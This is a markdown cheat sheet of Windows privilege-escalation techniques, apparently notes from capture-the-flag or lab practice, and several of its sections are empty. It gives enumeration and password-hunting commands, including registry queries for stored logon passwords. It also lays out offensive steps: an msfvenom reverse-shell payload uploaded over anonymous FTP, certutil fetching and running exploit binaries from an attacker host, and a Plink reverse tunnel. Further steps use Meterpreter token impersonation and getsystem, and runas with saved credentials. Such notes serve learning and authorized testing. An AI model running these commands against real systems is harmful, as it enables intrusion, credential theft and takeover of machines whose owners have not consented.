# Windows

## Manual Enumeration

### System

```powershell
systeminfo  # host name, OS Name, OS version, etc…
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic [command]
```

### User

```powershell
whoami
whoami /priv
whoami /groups
net user  # show users that are on the machine
net user [user]  # get information about a specific user
net localgroup administrator  # get users that belong to the administrator group
```

### Network

```powershell
ipconfig
ipconfig /all
arp -a
route print
netstat -ano
```

### Password Hunting

```powershell
findstr /si password *.txt *.ini *.config *xml  # searches from the directory for the word password in all the specified files
dir secret.doc /s /p  # searches recursively for a file called secret.doc
```

### A/V and Firewall Enumeration

```powershell
sc query windefend
sc queryex type= service
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
```

## Automated Enumeration

### Executables

* winPEAS
* seatbelt.exe
* Watson.exe
* SharpUp.exe

### PowerShell

* Sherlock.ps1
* PowerUp.ps1
* jaws-enum.ps1

### Other

* windows-exploit-suggester.py
* Exploit Suggester (Metasploit)

## Escalation Path Techniques

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Kernel Exploits

[https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

#### Metasploit

```bash
# From a Meterpreter shell
meterpreter > run post/multi/recon/local_exploit_suggester
# Ex: ms10_015 kitrap0d
msf > use exploit/windows/local/ms10_015_kitrap0d
```

#### Manual

```bash
# Foothold
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > manual.aspx
ftp <IP>  # Anonymous login
put manual.aspx
nc -lvnp 4444
http://<IP>/manual.aspx
# Exploit - after running windows-exploit-suggester
# Can Google for exploits already compiled
certutil -f http://<IP>/MS10-059.exe ms.exe  # From target
nc -lvnp 5555  # From Kali
ms.exe <Kali-IP> 5555  # From target
```

### Service Exploits

### Registry Exploits

#### Autoruns

```powershell
# Enumeration
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe

C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
# Looking for FILE_ALL_ACCESS for Everyone

powershell -ep bypass
. .\PowerIp.ps1
Invoke-AllChecks
# Exploitation

```

#### AlwaysInstallElevated

```powershell
```

#### regsvc ACL

```powershell
```

### Passwords

```powershell
# Search types of files for the word password
findstr /si password *.txt (*.xml, *.ini)
# Check for file shares only listening locally i.e. SMB (port forward)
netstat -ano  
# Searching registry
reg query HKLM /f password /t REG_SZ /s  # Look for plaintext passwords in output
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # find username and default passowrd
# Could be password reuse to test on Administrator or other account
```

#### Port Forward

```bash
# From Kali
# edit sshd_config, by uncommenting PermitRootLogin yes
service ssh restart
service ssh start
# From target
# Download Plink to the target
certutil -urlcache -f http://<IP>/plink.exe plink.exe
plink.exe -l root -pw <password> -R 445:127.0.0.1:445 <Kali-IP>
# Will be brought to root login within same shell
netstat -ano | grep 445  # Verify listening
winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"
```

### Scheduled Tasks

### Insecure GUI Apps

### Startup Apps

### Installed Apps

```
```

### Token Impersonation

```powershell
whoami /priv
meterpreter > getprivs
# Look for SeImpersonatePrivilege as Enabled
# Can use windows-exploit-suggester to find potato attacks
```

### Potato Attacks

```powershell
meterpreter > run post/multi/recon/local_exploit_suggester
msf use exploit windows/local/ms16_065_reflection
meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
meterpreter > shell
```

#### Alternate Data Streams

```powershell
# Regular directory listing
dir
hm.txt
# Recursive directory listing identifying alternate data streams
dir /R
hm.txt
hm.txt:root.txt:$DATA
# Read alternate data stream
more < hm.txt:root.txt:$DATA
```

### Port Forwarding

```powershell
```

### WSL

Running Linux on top of Windows

```powershell
where /R c:\windows wsl.exe
/path/to/wsl.exe whoami
where /R c:\windows bash.exe
/path/to/bash.exe
whoami, hostname, uname -a
python -c "import pty;pty.spawn('/bin/bash')"  # Get a TTY shell
# General Linux enumeration (history, .bash_history, etc.)
# If credentials are found...
psexec.py
smbexec.py
wmiexec.py
```

### getsystem

```bash
meterpreter > getsystem
meterpreter > getsystem -h
```

### RunAs

```powershell
cmdkey /list  # Look for Current stored credentials
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"

```

### DLL Hijacking

```powershell
```
